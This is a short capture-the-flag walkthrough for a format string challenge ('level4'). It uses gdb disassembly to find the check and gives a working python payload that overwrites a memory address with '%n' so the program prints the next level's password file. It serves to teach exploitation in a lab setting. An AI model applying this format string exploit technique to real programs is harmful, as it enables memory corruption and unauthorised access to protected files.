#Format String 2  
  
## Disassembled code  
`gdb -batch -ex "set disassembly-flavor intel" -ex "disas main" -ex "disas n" -ex "disas p" "level4" | GREP_COLOR='01;31' grep  --color=always -z 'printf\|+59\|+64'`  
![alt IMAGE] (Ressources/disassembled.png)  
  
  
##walkthrough  
At *n+59 we can see a cmp $eax with 0x1025544 and at *n+64 a jne to exit the program if the compare is not equal.  
  
if we jump from *n+64 to *n+66 and break at *n+73, we can see the system parameter is "/bin/cat /home/user/level5/.pass", if we bypass the jne at *n+59 we have the flag, but how we can do it ?  
  
If we break at *p+12 the printf parameter is our user input, the same bug as the previous exercise !  
  
Ok, "%x" print the address, and if we pass '\x41\x41\x41\x41' and break at *p+17 just after printf, and examin the top of the stack, we can see at "x/20x $esp+48" our string.  
You can use my 'loop\_address.py' to find the good parameter.  
  
ok. We have to replace the value of the 0x8049810 address, we proceed like the previous exercise in gdb:  
  
r <<\<$(python -c "print '\x10\x98\x04\x08' + '%16930112x' + '%12\$n'")  
  
ok, it's works.  
  
try this in real environment to print the flag:  
(python -c 'print "\x10\x98\x04\x08" + "%16930112x" + "%12$n"') | ./level4  
